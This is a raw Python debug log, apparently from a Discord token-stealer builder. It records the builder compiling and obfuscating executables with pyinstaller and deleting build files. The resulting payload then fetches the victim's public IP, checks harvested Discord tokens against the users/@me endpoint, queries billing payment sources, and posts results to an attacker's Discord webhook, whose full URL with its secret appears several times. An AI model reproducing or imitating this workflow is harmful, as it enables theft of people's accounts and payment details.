[admin.py:29] - 2026-06-27 13:20:55,994 - INFO - isUserAdmin - CheckTokenMembership returned: True
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,963 - DEBUG - STREAM b'IDAT' 91 766
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'IDAT' 91 601
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,964 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,965 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,965 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:30:21,965 - DEBUG - STREAM b'IDAT' 91 1063
[admin.py:29] - 2026-06-27 13:32:55,589 - INFO - isUserAdmin - CheckTokenMembership returned: True
[Image.py:421] - 2026-06-27 13:32:55,666 - DEBUG - Importing PngImagePlugin
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,684 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,684 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'IDAT' 91 766
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,685 - DEBUG - STREAM b'IDAT' 91 601
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,686 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,686 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,686 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,686 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:32:55,686 - DEBUG - STREAM b'IDAT' 91 1063
[builder.pyw:433] - 2026-06-27 13:33:20,595 - INFO - Nome do arquivo obtido: Qpz
[builder.pyw:402] - 2026-06-27 13:33:20,595 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:402] - 2026-06-27 13:33:20,595 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:454] - 2026-06-27 13:33:20,596 - INFO - Configuração alterada com sucesso
[builder.pyw:500] - 2026-06-27 13:34:15,114 - INFO - Sucesso ao compilar Qpz.exe com pyinstaller
[builder.pyw:512] - 2026-06-27 13:34:15,421 - INFO - Diretório removido com sucesso: ./build
[builder.pyw:521] - 2026-06-27 13:34:15,422 - INFO - Arquivo removido com sucesso: ./Qpz.spec
[builder.pyw:521] - 2026-06-27 13:34:15,422 - INFO - Arquivo removido com sucesso: ./tools/upx.exe
[builder.pyw:521] - 2026-06-27 13:34:15,423 - INFO - Arquivo removido com sucesso: ./Qpz.py
[admin.py:29] - 2026-06-27 13:39:09,037 - INFO - isUserAdmin - CheckTokenMembership returned: True
[Image.py:421] - 2026-06-27 13:39:09,114 - DEBUG - Importing PngImagePlugin
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,133 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,133 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,133 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,133 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,133 - DEBUG - STREAM b'IDAT' 91 766
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'IDAT' 91 601
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,134 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:39:09,135 - DEBUG - STREAM b'IDAT' 91 1063
[builder.pyw:433] - 2026-06-27 13:39:34,616 - INFO - Nome do arquivo obtido: 5639644
[builder.pyw:402] - 2026-06-27 13:39:34,616 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:402] - 2026-06-27 13:39:34,616 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:454] - 2026-06-27 13:39:34,618 - INFO - Configuração alterada com sucesso
[builder.pyw:500] - 2026-06-27 13:40:28,253 - INFO - Sucesso ao compilar 5639644.exe com pyinstaller
[builder.pyw:512] - 2026-06-27 13:40:28,982 - INFO - Diretório removido com sucesso: ./build
[builder.pyw:521] - 2026-06-27 13:40:28,983 - INFO - Arquivo removido com sucesso: ./5639644.spec
[builder.pyw:521] - 2026-06-27 13:40:28,983 - INFO - Arquivo removido com sucesso: ./tools/upx.exe
[builder.pyw:521] - 2026-06-27 13:40:28,983 - INFO - Arquivo removido com sucesso: ./5639644.py
[connectionpool.py:1062] - 2026-06-27 13:41:03,155 - DEBUG - Starting new HTTPS connection (1): media.discordapp.net:443
[connectionpool.py:544] - 2026-06-27 13:41:03,519 - DEBUG - https://media.discordapp.net:443 "GET /attachments/1520458778028277760/1520462576922787971/download.jpg?ex=6a41489f&is=6a3ff71f&hm=bec6eaf2b41d40520a9d772a44b297a13af94d78145618c7fa464d988221bf74&=&format=webp&width=663&height=648 HTTP/1.1" 200 22644
[builder.pyw:433] - 2026-06-27 13:41:06,487 - INFO - Nome do arquivo obtido: 5639644
[builder.pyw:399] - 2026-06-27 13:41:06,487 - INFO - Tipo de arquivo alterado: .py
[builder.pyw:454] - 2026-06-27 13:41:06,488 - INFO - Configuração alterada com sucesso
[vision.py:66] - 2026-06-27 13:43:09,845 - ERROR - Webhook inválido ou ausente em main(). Nenhum envio será feito.
[admin.py:29] - 2026-06-27 13:43:13,996 - INFO - isUserAdmin - CheckTokenMembership returned: True
[Image.py:421] - 2026-06-27 13:43:14,075 - DEBUG - Importing PngImagePlugin
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'IDAT' 91 766
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,094 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'IDAT' 91 601
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'IHDR' 16 13
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'sRGB' 41 1
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'gAMA' 54 4
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'pHYs' 70 9
[PngImagePlugin.py:204] - 2026-06-27 13:43:14,095 - DEBUG - STREAM b'IDAT' 91 1063
[connectionpool.py:1062] - 2026-06-27 13:43:32,200 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:43:32,709 - DEBUG - https://discord.com:443 "GET /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 200 None
[builder.pyw:433] - 2026-06-27 13:43:34,518 - INFO - Nome do arquivo obtido: QZ
[builder.pyw:402] - 2026-06-27 13:43:34,518 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:402] - 2026-06-27 13:43:34,519 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:454] - 2026-06-27 13:43:34,520 - INFO - Configuração alterada com sucesso
[builder.pyw:500] - 2026-06-27 13:44:30,629 - INFO - Sucesso ao compilar QZ.exe com pyinstaller
[builder.pyw:512] - 2026-06-27 13:44:31,256 - INFO - Diretório removido com sucesso: ./build
[builder.pyw:521] - 2026-06-27 13:44:31,256 - INFO - Arquivo removido com sucesso: ./tools/upx.exe
[builder.pyw:521] - 2026-06-27 13:44:31,256 - INFO - Arquivo removido com sucesso: ./QZ.spec
[builder.pyw:521] - 2026-06-27 13:44:31,257 - INFO - Arquivo removido com sucesso: ./QZ.py
[QZ.py:64] - 2026-06-27 13:44:34,389 - INFO - Enviando webhook: https://discord.com/api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC
[connectionpool.py:1062] - 2026-06-27 13:44:34,392 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:35,654 - DEBUG - https://discord.com:443 "POST /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 200 None
[QZ.py:100] - 2026-06-27 13:44:35,655 - INFO - Webhook enviado com sucesso: 200
[connectionpool.py:1062] - 2026-06-27 13:44:36,664 - DEBUG - Starting new HTTPS connection (1): api.ipify.org:443
[connectionpool.py:544] - 2026-06-27 13:44:37,191 - DEBUG - https://api.ipify.org:443 "GET / HTTP/1.1" 200 14
[connectionpool.py:1062] - 2026-06-27 13:44:37,199 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:37,799 - DEBUG - https://discord.com:443 "POST /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 204 0
[connectionpool.py:1062] - 2026-06-27 13:44:37,805 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:38,362 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:38,365 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:38,917 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:38,927 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:39,474 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:39,478 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:40,033 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:40,037 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:40,583 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:40,730 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:41,334 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 200 None
[connectionpool.py:1062] - 2026-06-27 13:44:41,403 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:41,985 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 200 None
[connectionpool.py:1062] - 2026-06-27 13:44:41,994 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:42,558 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:42,562 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:43,123 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:43,128 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:43,682 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:43,864 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:44,404 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:44,408 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:44,963 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:44,967 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:45,497 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:45,502 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:46,040 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:47,510 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:48,195 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 401 43
[connectionpool.py:1062] - 2026-06-27 13:44:48,327 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:48,866 - DEBUG - https://discord.com:443 "GET /api/v9/users/@me HTTP/1.1" 200 None
[connectionpool.py:1062] - 2026-06-27 13:44:48,870 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:49,790 - DEBUG - https://discord.com:443 "GET /api/v6/users/@me/billing/payment-sources HTTP/1.1" 200 3
[connectionpool.py:1062] - 2026-06-27 13:44:49,793 - DEBUG - Starting new HTTPS connection (1): cdn.discordapp.com:443
[connectionpool.py:544] - 2026-06-27 13:44:50,344 - DEBUG - https://cdn.discordapp.com:443 "GET /avatars/1515382068152893470/c56865433f3781c93fc681d14668d6ba.gif HTTP/1.1" 415 126
[connectionpool.py:1062] - 2026-06-27 13:44:50,347 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:50,890 - DEBUG - https://discord.com:443 "POST /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 204 0
[Image.py:421] - 2026-06-27 13:44:50,920 - DEBUG - Importing PngImagePlugin
[connectionpool.py:1062] - 2026-06-27 13:44:50,958 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:44:51,958 - DEBUG - https://discord.com:443 "POST /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 200 None
[builder.pyw:433] - 2026-06-27 13:48:56,060 - INFO - Nome do arquivo obtido: QZ
[builder.pyw:402] - 2026-06-27 13:48:56,060 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:402] - 2026-06-27 13:48:56,060 - INFO - Tipo de arquivo alterado: pyinstaller
[builder.pyw:454] - 2026-06-27 13:48:56,061 - INFO - Configuração alterada com sucesso
[builder.pyw:537] - 2026-06-27 13:48:56,358 - INFO - Sucesso ao ofuscar o arquivo: QZ.py
[builder.pyw:500] - 2026-06-27 13:49:50,224 - INFO - Sucesso ao compilar QZ.exe com pyinstaller
[builder.pyw:512] - 2026-06-27 13:49:51,120 - INFO - Diretório removido com sucesso: ./build
[builder.pyw:521] - 2026-06-27 13:49:51,120 - INFO - Arquivo removido com sucesso: ./tools/upx.exe
[builder.pyw:521] - 2026-06-27 13:49:51,121 - INFO - Arquivo removido com sucesso: ./QZ.spec
[builder.pyw:521] - 2026-06-27 13:49:51,121 - INFO - Arquivo removido com sucesso: ./QZ.py
[connectionpool.py:1062] - 2026-06-27 13:49:54,504 - DEBUG - Starting new HTTPS connection (1): api.ipify.org:443
[connectionpool.py:544] - 2026-06-27 13:49:54,972 - DEBUG - https://api.ipify.org:443 "GET / HTTP/1.1" 200 14
[<string>:64] - 2026-06-27 13:49:58,793 - INFO - Enviando webhook: https://discord.com/api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC
[connectionpool.py:1062] - 2026-06-27 13:49:58,796 - DEBUG - Starting new HTTPS connection (1): discord.com:443
[connectionpool.py:544] - 2026-06-27 13:49:59,803 - DEBUG - https://discord.com:443 "POST /api/webhooks/1520469174596407417/bA-nx_QL4aP_ocbFXI2CVrOxpCurWjWakFkJuOm71zWzEbgXmnlHYwwsGQwa63H6R3rC HTTP/1.1" 200 None
[<string>:100] - 2026-06-27 13:49:59,804 - INFO - Webhook enviado com sucesso: 200
[connectionpool.py:1062] - 2026-06-27 13:50:00,584 - DEBUG - Starting new HTTPS connection (1): api.ipify.org:443
[connectionpool.py:544] - 2026-06-27 13:50:01,127 - DEBUG - https://api.ipify.org:443 "GET / HTTP/1.1" 200 14
